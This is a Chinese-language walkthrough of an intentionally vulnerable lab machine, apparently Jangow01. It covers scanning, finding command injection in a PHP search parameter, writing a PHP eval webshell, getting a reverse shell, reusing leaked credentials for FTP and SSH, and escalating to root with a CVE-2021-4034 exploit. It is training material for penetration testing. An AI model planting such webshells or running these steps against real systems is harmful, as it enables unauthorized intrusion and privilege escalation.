靶机IP：192.168.56.118，Nmap进行端口扫描，靶机开放80以及21FTP端口，尝试FTP弱口令是否能登陆，经测试，anoymous/anoymous弱口令不存在。![](../Images/607589be7a152de2c43d921927ced527.png)随后访问80端口，web站点出现，PHP站点+Apache中间件。

![](../Images/ab1864e06c44e4a06320e92fef204db1.png)

尝试进行目录扫描：只发现了静态资源文件夹![](../Images/4f035ef595a0c5bb777158ae6a7937c4.png)尝试访问其它界面：http://192.168.56.118/site/busque.php?buscar=

bp进行不断Fuzz，命令执行漏洞X1![](../Images/927699158e985969dc4ded7efaedf5a4.png)![](../Images/8e2f4f20aed926de1600cd7c822a30cf.png)

## 3.一句话木马Getshell

既然存在命令执行，尝试使用PHP反弹shell试试，PHP反弹shell失败，怀疑不出网

查看系统有无python，使用python反弹shell，nc没反应，大概率就是不出网![](../Images/bcb340431c79755f127ee7a123755fc5.png)

随后转变思路，尝试echo一句话进去，哥斯拉生成php马

```
echo '<?php eval($_POST["ace"]);'
 > ace.php
```

![](../Images/19e68089d9f3a6a48bb019561ebefb13.png)木马成功写入，使用哥斯拉连接，随后查看站点目录有无可用信息等，发现数据库连接信息，但是数据库服务未开启，但站点开启了21FTP端口，尝试此账号密码登陆失败。![](../Images/11ada40240f5ef3dcd3a63d254872a47.png)

继续找别的敏感信息，随后再整站目录下发现另外一个数据库连接账号密码的备份文件。![](../Images/6c39b4a5df6dcfed1c44cda62ff5fcea.png)

继续尝试用账号密码进行FTP登陆，提示登陆成功![](../Images/a5181c86e9d82c3ee63bf95d66c11d4c.png)随后cd到不同的目录中，查找文件，由于当前为www权限，进入目录很多无权限。进入到home目录下，发现关键信息![](../Images/dc55d466390ec44840e7d54fb206560f.png)jangow01文件夹下存放了user.txt，使用FTP命令下载到本地打开![](../Images/6bfd54ac13db648e05b200dc119e4723.png)第一个Flag已拿到：d41d8cd98f00b204e9800998ecf8427e

## 4.反弹Shell

哥斯拉的中有不出网反弹shell的模块：RealCmd，填好参数后，尝试进行shell反弹![](../Images/187fd79050aff2b6cab66007fcf68a4b.png)

本地nc监听4444即可：![](../Images/a7a1113c1bbbe26b9d1ea2ccf685ea58.png)反弹成功，但是此时反弹回来的shell很多命令都没办法使用，比如top，vim，sudo等![](../Images/8d015fceac5990e93ef2a276e69cd1b4.png)如果此时目标主机存在python环境的话，我们可以尝试使用ptyshell可以实现简单的tty。

whereis python查看有无python环境，信息收集的时候我们已经得知，靶机有python3环境，于是直接运行：

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

![](../Images/38904ac233d0809246567a8e174908fe.png)

然后就可以尝试各种命令了，再查看端口的时候，发现开放了22SSH端口：

![](../Images/5fc53b0c14e67974e57f16f5c5a2499c.png)

如果可以SSH登陆进去，那就很方便了。

尝试SSH登陆，使用刚刚的FTP账号密码进行尝试。吼，登陆成功

![](../Images/fa00e91eb25c3af5f2a1553924964262.png)

## 5.提权（1）

目前针对这台主机已经拿下webshell，FTP账号密码，SSH账号密码，但是shell权限是www，无法查看root下的文件，那就提权。

uname -a 得知是ubuntu 4.4.0，，Kali直接：searchspolit 4.4.0![](../Images/349002dfa248fd3daf3c45832bf1b1a4.png)![](../Images/8dbd8d25b05b287001024ab9ecf72606.png)也可直接百度搜索ubuntu 4.4.0提权等等，在此我使用的是脏牛或者CVE-2021-4034

首先查看目标主机是否安装gcc![](../Images/94459d4643cecd9202ff35aab1350438.png)随后上传CVE-2021-4034到/tmp临时目录下，使用FTP上传或者哥斯拉上传都可以。![](../Images/64f9d830424261212ef981deeadb6bd2.png)随后进入到tmp目录下，随后编译此文件![](../Images/60385625d8f8e371d4bede69742efd70.png)编译成功后会在当前目录生成exp文件

![](../Images/17d57ae93b23699bcffab477fb806284.png)

随后./exp进行提权操作，成功提升至root权限！![](../Images/d581ba5c0a9d056bb5bfbb4845547464.png)进入root目录下查看文件![](../Images/eddf4ee1002ca27629bb18469269a645.png)读取proof.txt，第二个Flag拿到

![](../Images/afba26c64d6e7470a35902a890be56b2.png)
